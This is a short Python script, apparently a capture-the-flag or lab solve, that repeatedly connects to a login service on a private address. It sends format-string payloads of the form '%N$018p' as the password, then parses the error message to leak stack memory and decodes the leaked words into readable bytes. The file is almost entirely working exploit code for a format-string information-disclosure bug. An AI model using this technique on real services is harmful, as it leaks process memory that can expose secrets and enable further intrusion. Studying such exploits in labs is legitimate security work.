#! /usr/bin/python3
import socket
from typing import Iterable, Union

import tqdm

server_ip = '10.21.235.155'
server_port = 1023


# Note should the input arguments be bytes?
def connect(username: bytes = b"test", password: bytes = b"test") -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.send(username)
        s.send(b'\n')
        s.send(password)
        s.send(b'\n')

        f = s.makefile('rb')
        for i in range(3):
            line = f.readline()

        line = line[line.find(b'?') + 2:]
        line = line[:line.find(b" is not the correct password.")]

        return line


def readable_decode(inp: Union[bytes, Iterable[int]]) -> str:
    out = ''
    for byte in inp:
        if 33 <= byte <= 125:
            out += chr(byte)
        else:
            out += f"\\x{byte:02x}"
    return out


def main():
    words_to_check = 256  # 1024 * 2
    num_inner = 4  # 64
    # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself

    for i in tqdm.trange(1, words_to_check + 1):
        u = set()
        for j in range(num_inner):
            u.add(connect(username=b"surajishi", password=b"%%%i$018p" % i).decode('ASCII'.replace(' ', '0'))[2:])
        if '           (nil)' in u:
            u.remove('           (nil)')
        if '' in u:
            u.remove('')
        if len(u) == 1:
            v = tuple(u)[0]
            str_bytes = (v[:2], v[2:4], v[4:6], v[6:8], v[8:10], v[10:12], v[12:14], v[14:16])[::-1]
            if v[:16] == "0000000000000000":
                continue
            byte_bytes = [int(s, 16) for s in str_bytes]
            tqdm.tqdm.write(f"{i:4}:  {v}  {readable_decode(byte_bytes)}")


if __name__ == '__main__':
    main()
